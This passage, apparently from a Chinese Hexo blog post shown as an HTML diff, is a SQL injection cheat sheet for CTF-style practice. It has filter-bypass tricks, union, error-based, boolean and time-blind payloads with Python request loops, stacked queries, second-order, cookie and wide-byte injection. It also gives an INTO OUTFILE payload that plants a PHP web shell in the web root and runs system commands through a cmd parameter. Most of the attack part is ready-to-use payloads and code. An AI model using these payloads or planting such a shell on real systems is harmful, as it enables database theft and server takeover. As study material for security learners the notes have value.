提取表名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;提取表名中...&quot;</span>)</span><br><span class="line">    tables = extract_table_name()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的表名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tables)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取列名</span></span><br><span class="line">    table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要提取列名的表名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;提取表 <span class="subst">&#123;table_name&#125;</span> 的列名中...&quot;</span>)</span><br><span class="line">    columns = extract_column_name(table_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的列名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(columns)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取数据</span></span><br><span class="line">    column_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要提取数据的列名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;提取表 <span class="subst">&#123;table_name&#125;</span> 中列 <span class="subst">&#123;column_name&#125;</span> 的数据中...&quot;</span>)</span><br><span class="line">    data = extract_data(table_name, column_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取到的数据：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="零-绕过方式"><a href="#零-绕过方式" class="headerlink" title="零.绕过方式"></a>零.绕过方式</h2><blockquote>
+<blockquote>
+<p><strong>大小写绕过</strong>：比如过滤select时，在不区分大小写时候可以Select绕过</p>
+</blockquote>
+<blockquote>
+<p><strong>双写绕过</strong>：过滤关键字可以用selselctect来绕过</p>
+</blockquote>
+<blockquote>
+<p><strong>空格绕过</strong>：</p>
+<p>○&#x2F;**&#x2F;可以代替空格当空格被过滤的时候</p>
+<p>例如：select&#x2F;**&#x2F;user&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</p>
+<p>○可以使用Tab代替空格</p>
+<p>○可以使用空格url编码%20</p>
+<p>○如果空格被过滤，括号没有被过滤，可以用括号绕过</p>
+<p>例如：select(user)from(users);</p>
+</blockquote>
+<blockquote>
+<p><strong>&#x3D;被过滤</strong>：可以用like或rlike，也可以用regexp（正则来匹配）来绕过</p>
+<p>比如&#x3D;’admin’就可以like’admin’</p>
+</blockquote>
+<blockquote>
+<p><strong>select被过滤</strong>：可以使用desc倒序查看表内的字段，也可以showcolumnsfrom表名。当需要查看具体信息的时候，可以使用预处理语句（堆叠注入查询）</p>
+</blockquote>
+<blockquote>
+<p><strong>编码绕过</strong>：两次URL全编码</p>
+</blockquote>
+</blockquote>
+<h2 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一.联合注入"></a>一.联合注入</h2><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>union内部的select语句<strong>必须拥有相同数量的列</strong>。列也必须拥有相似的数据类型。</p>
+<p>同时，每条select语句中的列的顺序必须是相同的。</p>
+</blockquote>
+<p>有时返回的不是我们想要的数据，请记住返回值（要显示的那个！）在原查询的位置</p>
+<p>在进行联合查询时，同位置的就会覆盖显示过去（尽管可能都不在一个表，不是一个名）</p>
+<h3 id="一些小部件"><a href="#一些小部件" class="headerlink" title="一些小部件"></a>一些小部件</h3><h4 id="1-order-by"><a href="#1-order-by" class="headerlink" title="1.order by"></a>1.order by</h4><p>除了关键字DESC,还可以：</p>
+<p><code>order by column_name/数字（对应第几列）</code></p>
+<p><strong>不存在（名字or列数）会报错</strong></p>
+<h4 id="2-concat"><a href="#2-concat" class="headerlink" title="2.concat"></a>2.concat</h4><p>拼接字符串,格式：</p>
+<p><code>concat(str1，str2)</code></p>
+<p>其中一个为null，就会直接返回null</p>
+<h4 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat"></a>3.group_concat</h4><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat([distinct]要连接的字段[order by 排序字段 asc/desc][separator ‘分隔符’])</span><br></pre></td></tr></table></figure>
+
+<p><code>distinct</code>	去重</p>
+<p>分隔符默认是逗号</p>
+<h4 id="4-group-by"><a href="#4-group-by" class="headerlink" title="4.group by"></a>4.group by</h4><p>值得注意的是，MySQL实现这个是通过建立一个临时空表</p>
+<h4 id="5-substr"><a href="#5-substr" class="headerlink" title="5.substr"></a>5.substr</h4><p>格式：substr(string，start，length)</p>
+<p>0是第一个位置，负数从结尾指定位置开始</p>
+<p>length可选，默认是到结束位置</p>
+<h4 id="6-ascll"><a href="#6-ascll" class="headerlink" title="6.ascll"></a>6.ascll</h4><p>格式：ascii(str)</p>
+<p>返回字符串最左边字符的ascll</p>
+<p><strong>只返回一个</strong></p>
+<h4 id="7-database"><a href="#7-database" class="headerlink" title="7.database()"></a>7.database()</h4><p>当前使用的数据库，相当于使用该库名</p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1.判断注入点</p>
+<p>用’等尝试破环查询语句，看看回显（整型不用闭合）</p>
+<p>&#x2F;&#x2F;整型都不用引号，字符型要注意闭合</p>
+<p>2.摸个表！</p>
+<p>用上面的order by 数字，看看到多少会报错（回显异常）</p>
+<p>以及摸一摸回显的在第几个位置（实在不行直接1，2，3看回来哪个）</p>
+<p>3.开查！</p>
+<blockquote>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名称&#x27;</span><br><span class="line">&gt;//查表名</span><br><span class="line"></span><br><span class="line">&gt;&gt;id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;表名称&#x27;</span><br><span class="line">&gt;//查字段名（列名）</span><br><span class="line"></span><br><span class="line">&gt;&gt;id=1 union select 1,2,字段名 from 表名</span><br><span class="line">&gt;//查详细信息</span><br></pre></td></tr></table></figure>
+</blockquote>
+</blockquote>
+<h2 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二.报错注入"></a>二.报错注入</h2><p>前提是会回显错误，可以乱写SQL试一试有没有显示报错</p>
+<h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml()"></a>1.updatexml()</h3><h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><blockquote>
+<p>select * from major where id&#x3D;1 and updatexml(1,concat(0x26,(select database()),0x26),3)</p>
+</blockquote>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>updatexml（xml_documat，XPath_string，new_value）</p>
+<p><code>xml_documat</code>：string，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。</p>
+<p><code>XPath_string</code>：XPath（一种字符串格式），报错注入时需要写入错误的格式来显示错误的信息。</p>
+<p>new_value：string，替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用0x26开头，显然不是XPath格式，这是报错。</p>
+<p>XPath格式出错会返回其内容，因此用concat把我们要的东西连在0x26后</p>
+<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h3><h4 id="模板-1"><a href="#模板-1" class="headerlink" title="模板"></a>模板</h4><blockquote>
+<p>select * from major where id&#x3D;1 and extractvalue(1,concat(0x26,(selectdatabase()),0x26)</p>
+</blockquote>
+<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>extractvalue（xml_documat，XPath_string）</p>
+<p>原理同上</p>
+<h2 id="三-布尔盲注"><a href="#三-布尔盲注" class="headerlink" title="三.布尔盲注"></a>三.布尔盲注</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><h4 id="1-查数据库"><a href="#1-查数据库" class="headerlink" title="1.查数据库"></a>1.查数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and (length(database())&gt;3    </span><br><span class="line">-- 查长度         </span><br><span class="line">          </span><br><span class="line">id=1 and (ascii(substr(database(),1,1))&gt;110   </span><br><span class="line">-- 查具体字符</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-查表"><a href="#2-查表" class="headerlink" title="2.查表"></a>2.查表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0  </span><br><span class="line">-- 查表数，加limit子句分页输出，改变起始位置，长度不变，直到报错（不存在当然无法比较）</span><br><span class="line"></span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit0,1),1,1))=110</span><br><span class="line">-- 查表名</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-查字段"><a href="#3-查字段" class="headerlink" title="3.查字段"></a>3.查字段</h4><p>假设查出的表名是flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1</span><br><span class="line">-- 查列数</span><br><span class="line"></span><br><span class="line">1 and ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot; [and ordinal_position = 1]),1,1))=102</span><br><span class="line">-- 查列名，同样通过改start参数来换位置,改ordinal_position来查询其他列</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-查数据"><a href="#4-查数据" class="headerlink" title="4.查数据"></a>4.查数据</h4><p>假设查出来的列名也是flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and(select count(flag) from flag)=1</span><br><span class="line">-- 查有多少个字段信息（多少非空行）</span><br><span class="line"></span><br><span class="line">1 and ascii(substr((select flag from flag limit 0,1),32,1))</span><br><span class="line">-- 查字段信息有多长，改substr的start来判断长度，改limit的start来换行</span><br><span class="line"></span><br><span class="line">1 and ascii(substr((select flag from flag limit0,1),1,1))=99</span><br><span class="line">-- 查具体字段信息</span><br></pre></td></tr></table></figure>
+
+<p>很显然，你并不必要查名字或者字段信息的长度，因为不存在也无法比较</p>
+<p>对于字符信息，也可以用ascii值为0来当作结束条件。</p>
+<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = requests.post(url, data=payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">	head = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    tail = mid</span><br></pre></td></tr></table></figure>
+
+<h2 id="四-时间盲注"><a href="#四-时间盲注" class="headerlink" title="四.时间盲注"></a>四.时间盲注</h2><p>和布尔盲注类似，但是不依赖固定的返回值</p>
+<p>两者只有判断条件的不同</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0)</span><br><span class="line">#对于布尔盲注，要把sleep(3)改为1，来返回真，此后判断返回值是否含有错误时的内容来判断</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注是：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start_time = time.time()</span><br><span class="line">r = requests.post(url, data=payload)</span><br><span class="line">end_time = time.time()</span><br><span class="line">elapsed_time = end_time - start_time</span><br><span class="line"><span class="keyword">if</span> elapsed_time &gt;= <span class="number">3</span>:</span><br><span class="line">	head = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    tail = mid</span><br></pre></td></tr></table></figure>
+
+<h2 id="五-堆叠查询注入"><a href="#五-堆叠查询注入" class="headerlink" title="五.堆叠查询注入"></a>五.堆叠查询注入</h2><h3 id="模板-2"><a href="#模板-2" class="headerlink" title="模板"></a>模板</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;select * from major;#</span><br></pre></td></tr></table></figure>
+
+<h3 id="流程（select被过滤）"><a href="#流程（select被过滤）" class="headerlink" title="流程（select被过滤）"></a>流程（select被过滤）</h3><p><code>show databases</code></p>
+<p><code>show tables</code></p>
+<p>desc `表名`       </p>
+<p>或者</p>
+<p>show columns from `表名`</p>
+<p>sEt @a&#x3D;concat(“sel”,”ect 列名 from `表名`“);PRepare hello from @a;execute hello</p>
+<p>——-多次堆叠和预处理语句</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>SQL语句可以堆叠，多语句分号隔开，这也导致你其实可以直接修改数据库……</p>
+<p>加上盲注的几个，就可以窃取+修改（可刑可拷）</p>
+<h3 id="EX-预处理语句"><a href="#EX-预处理语句" class="headerlink" title="EX.预处理语句"></a>EX.预处理语句</h3><p>一种特殊的SQL处理方式；预处理不会直接执行SQL语句，而是先将SQL语句编译，生成执行计划，然后通过Execute命令携带SQL参数来执行SQL语句</p>
+<p>模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@a prepare xxx as select * from user where id=1;  -- 将select查询语句(@a)定义为xxx </span><br><span class="line">然后就</span><br><span class="line">execute xxx -- 执行@a语句，为了避免过滤，上面使用concat来组成select</span><br><span class="line">可以用set来对@a参数赋值（可见concat的返回值就是结果）</span><br></pre></td></tr></table></figure>
+
+<h2 id="六-二次注入"><a href="#六-二次注入" class="headerlink" title="六.二次注入"></a>六.二次注入</h2><p>用于注册加登录加可以改密的页面，所以叫二次</p>
+<p>注册时加点特殊字符</p>
+<p>比如用户名&amp;密码设为：</p>
+<p>‘admin123”\</p>
+<p>如果登录后改密会<strong>报错</strong>，说明可以二次注入</p>
+<p>然后：</p>
+<p>只要在用户名处用报错注入</p>
+<p>修改密码的时候就会触发（密码都是随便填，但要记住，登录要用）</p>
+<h2 id="七-cookie注入"><a href="#七-cookie注入" class="headerlink" title="七.cookie注入"></a>七.cookie注入</h2><p><strong>本质上只是注入点不同</strong></p>
+<p>一种变体，只有参数用cookie传递的时候才能用</p>
+<p>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_id</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = &#x27;<span class="subst">$user_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就抓包，直接去cookie里找user_id，使用其他注入方式</p>
+<p>类似的，<strong>请求头的各个位置都有可能可以注入</strong></p>
+<h2 id="八-outfile-sql注入"><a href="#八-outfile-sql注入" class="headerlink" title="八.outfile_sql注入"></a>八.outfile_sql注入</h2><p><strong>MySQL如果没有写入权限，想都不要想这玩意儿</strong></p>
+<p>这是一个关键字，基本语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE </span><br></pre></td></tr></table></figure>
+
+<p>于是可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;SELECT &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;; --</span><br></pre></td></tr></table></figure>
+
+<p>这样，如果我们执行了这个php文件（所以你写的必须放在这个网站的根目录，通常是&#x2F;var&#x2F;www&#x2F;html&#x2F;），就可以使用</p>
+<p> <code>http://example.com/shell.php?cmd=ls</code> 来执行系统命令。 </p>
+<p>万一不知道路径？</p>
+<p>可以先联合注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,@@basedir,@@datadir #</span><br></pre></td></tr></table></figure>
+
+<p><code>@@basedir</code>	系统变量，是MySQL的安装路径</p>
+<p><code>@@datadir</code>	系统变量，是MySQL的文件路径</p>
+<p>（都是绝对路径）</p>
+<p>EX.配置环境</p>
+<p>在MYSQL安装目录下的my.ini，增加一个：secure-file-priv&#x3D;””</p>
+<p><strong>重启生效</strong></p>
+<p>可以用sql命令：</p>
+<p>show variables like “secure_file_priv”或show variables like “secure_file_priv”</p>
+<p>来查看当前设置，NULL表示禁止导入导出，空表示不限制，</p>
+<p>若值为&#x2F;tmp&#x2F;，表示限制mysqld的导入、导出只能发生在&#x2F;tmp&#x2F;目录</p>
+<h2 id="九-宽字节注入"><a href="#九-宽字节注入" class="headerlink" title="九.宽字节注入"></a>九.宽字节注入</h2><p>仅限数据库时GBK编码和后端进行\转义</p>
+<p>此时闭合用的%27（单引号）改成%df%27（GBK编码下是个汉字）</p>
+<p>因为汉字双字节，所以PHP转义的\会被吃掉</p>
+<p>然后联合查询</p>
+<p>注意：由于’被转义</p>
+<p>table_schema&#x3D;’库名’</p>
+<p>要改为嵌套查询</p>
+<p>table_schema&#x3D;(select database())</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=20%df%27union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(selectdatabase())%23</span><br><span class="line">-- 查列</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema=(selectdatabase()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>这里就使用了三层嵌套，第一层是table_schema，它代表库名的嵌套，第二层和第三层是table_name的嵌套，这里可以看到语句中有两个limit，前一个limit控制表名的顺序，后一个则控制字段名的顺序。这里就可以查询到表中的字段信息，剩下的就是查询详细信息，这里就不做介绍</p>
+</blockquote>
+<p>在PHP中，通过iconv()进行编码转换时，也可能存在宽字符注入漏洞</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/"></li>
+                <li class="wechat-code"><img src="/"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2025/02/05/XSS/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                XSS</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2025/01/23/%E6%97%A5%E5%B8%B8/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                日常</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+
+
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="hojun.cn" class="profile gravatar"><img src="https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg" itemprop="image" alt="hojun" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="hojun.cn" itemprop="url" rel="author">hojun</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2025 这玩意儿是昵称<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://zhewanyiershinicheng.github.io/images/mianhua.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">这就是-------Potato</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/zhewanyiershinicheng" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="/" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
+      
+        <a href="/" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E8%B5%84%E6%BA%90/">
+                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                  资源
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E9%9A%8F%E6%83%B3/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  随想
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  转载
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E7%A6%BB%E8%B0%B1/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  离谱
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E5%8F%91%E7%94%B5/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  发电
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/%E6%82%A6%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  书单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/%E5%9B%BE%E9%9B%86/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
